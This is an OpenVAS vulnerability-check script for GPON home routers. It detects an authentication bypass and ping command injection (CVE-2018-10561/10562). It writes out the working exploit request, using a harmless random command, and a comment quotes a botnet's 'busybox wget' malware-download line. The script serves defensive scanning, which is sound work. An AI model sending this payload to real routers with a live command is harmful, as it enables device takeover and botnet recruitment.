###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_gpon_router_mult_vuln.nasl 13864 2019-02-26 07:19:57Z cfischer $
#
# GPON Home Routers Multiple Vulnerabilities
#
# Authors:
# Jan Philipp Schulte <jan.schulte@greenbone.net>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH, https://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if( description )
{
  script_oid("1.3.6.1.4.1.25623.1.0.113170");
  script_version("$Revision: 13864 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-26 08:19:57 +0100 (Tue, 26 Feb 2019) $");
  script_tag(name:"creation_date", value:"2018-05-03 16:26:55 +0200 (Thu, 03 May 2018)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_cve_id("CVE-2018-10561", "CVE-2018-10562");

  script_name("GPON Routers Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_gpon_home_router_detect.nasl");
  script_mandatory_keys("gpon/home_router/detected");

  script_tag(name:"summary", value:"GPON Home Routers are prone to multiple vulnerabilities.

  Those vulnerabilities where known to be exploited by the Mettle, Muhstik, Mirai, Hajime, and Satori Botnets in 2018.");

  script_tag(name:"vuldetect", value:"The script tries to exploit both vulnerabilities and execute and 'id' command
  on the target and checks if it was successful.");

  script_tag(name:"insight", value:"There exist two vulnerabilities:

  - Appending '?images/' to the URL when accessing the router's web interface will bypass authentication

  - The 'ping' command of the router allows for code execution.");

  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to gain complete control over
  the target.");

  script_tag(name:"affected", value:"All GPON Home Routers are possibly affected.");

  script_tag(name:"solution", value:"Contact the vendor to optain a solution.");

  script_xref(name:"URL", value:"https://www.vpnmentor.com/blog/critical-vulnerability-gpon-router/");

  exit(0);
}

CPE = "cpe:/o:gpon:home_router";

include( "host_details.inc" );
include( "http_func.inc" );
include( "http_keepalive.inc" );
include( "misc_func.inc" );

if( ! port = get_app_port( cpe: CPE ) ) exit( 0 );
if( ! get_app_location( cpe: CPE, port: port, nofork: TRUE ) ) exit(0);

# Just execute a command that certainly doesn't exist
# This allows for a safe check of command execution
non_command = rand_str( length: 12, charset: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" );

# Older versions of GPON Home Routers use a direct html page link
exploit_urls = make_list( '/GponForm/diag_Form?images/', '/menu.html?images/' );
exploit_data = 'XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=\\`' + non_command + '\\`;' + non_command + '&ipv=0"';
result_url = '/diag.html?images/';

foreach url ( exploit_urls ) {
  req = http_post( port: port, item: url, data: exploit_data );
  # response is unimportant at this point, check for success happens on a different page
  http_keepalive_send_recv( port: port, data: req );
}

# Exploit needs a few seconds to take form
sleep( 5 );
req = http_get( port: port, item: result_url );
res = http_keepalive_send_recv( port: port, data: req );
if( ! res || res !~ "^HTTP/1\.[01] 200" )
  exit( 99 );

# var diag_result = "BusyBox... means ping command could be overwritten, but shell output could not be retrieved
#
# var diag_host = "`busybox wget http://xxx/bins/hotaru.arm -O /tmp/gaf means the box has already been compromised
if( string('sh: ', non_command, ': not found' ) >< res || 'diag_result = "BusyBox v' >< res ) {
  report = report_vuln_url(  port: port, url: result_url  );
  VULN = TRUE;
}

if( expl = egrep( string:res, pattern:'var diag_host = "`' ) ) {
  report  = report_vuln_url(  port: port, url: result_url  );
  report += '\n\nNOTE: The device has already been exploited by an attacker with the following command: ' + expl;
  VULN = TRUE;
}

if( VULN ) {
  security_message( data: report, port: port );
  exit( 0 );
}

exit( 99 );
